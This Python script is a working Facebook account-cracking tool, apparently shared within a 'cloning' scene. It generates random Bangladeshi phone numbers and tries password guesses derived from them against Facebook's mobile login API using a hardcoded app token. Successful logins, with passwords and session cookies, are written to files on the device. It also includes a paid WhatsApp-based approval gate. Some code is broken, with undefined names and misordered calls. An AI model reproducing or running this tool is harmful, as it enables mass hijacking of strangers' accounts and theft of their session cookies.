#WRITTEN BY MD ARAFAT HOSSEN
#CREDIT GOES TO DARK NET HACKER BOYS
#WRITTING START
#---------------------import-------------------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#---------------------color---------------------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
Y="\033[1;33m"        # Yellow
BC="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#---------------------logo----------------------------#
logo=(f'''{B}
{M}█████  ██████   █████  ███████  █████  ████████
{P}██   ██ ██   ██ ██   ██ ██      ██   ██    ██
{H}███████ ██████  ███████ █████   ███████    ██
{C}██   ██ ██   ██ ██   ██ ██      ██   ██    ██
{Y}██   ██ ██   ██ ██   ██ ██      ██   ██    ██
{M}--------------------------------------------{B}
 Owner    : {M}MD-ARAFAT-HOSSEN{M}
 Guthub   : {C}MD-ARAFAT1001
 Facebook :{Y}MD ARAFAT HOSSEN 
 Tools    : F{C}/{B}R{C}/{B}G{M} •{warna}[{H}MY FRIST PROGRAM {warna}]{warna}
--------------------------------------------{B}''')
#---------------------linex def----------------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
    
    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DAYS 250 TK 30 DAYS 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 ABAL😎 """)

                  #__APPROVAL SYSTEM ADD___#
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Asif950/Aprooval/blob/main/Aprooval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
     # print(" \033[32;1m[+] Your Kay : "+id))
      print(' \x1b[38;5;208m[𝟷] FILE CLONING')      
      print(' \x1b[1;98m[𝟸] ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;97m║══[𝟸] WI-FI  AND DATA BOTH WORKING 100%')
      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
      input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801310329198'+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#---------------------clear def----------------------#
def clear():
    clr('clear')
    print(logo)
#----------------------main def----------------------#
def MD_ARAFAT():
    clear()
    os.system('xdg-open https://github.com/MD-ARAFAT1001')
    print(f'{Y} [{warna}01{Y}] RANDOM CLONING ')
    print(f'{M} [{warna}00{M}] EXIT TERMINAL ')
    linex()
    option=input(f' {Y}[{warna}??{Y}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear This is my first program:)')
#----------------------bd clone def---------------#
def BD_CLONING():
    user=[]
    clear()
    print(f'{Y} EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input('{C} ENTER SIM CODE >> ')
    linex()
    print(f'{P}EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(f'{BC}ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Arafat:
        tl=str(len(user))
        print(f'{Y}TOTAL ACCOUNT : '+tl)
        print(f'{M}YOUR SIM CODE : '+code)
        print(f'{Y} PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            Arafat.submit(method_crack,ids,passlist)
    linex()
    print(f'{Y}THE PROGRESS HAS BEEN COMPLETE ')
    print(f'{M}TOTAL OK ID '+str(len(oks)))
    print(f'{C}TOTAL CP ID '+str(len(cps)))
    input(f'{Y} PRESS ENTER TO BACK  : ')
    MD_ARAFAT()
#-----------------method crack def----------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'arafat': arafat, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header= {'User-Agent': '[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}

            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[ARAFAT-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/ARAFAT-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[ARAFAT-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/ARAFAT-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------------end-------------------#
MD_ARAFAT()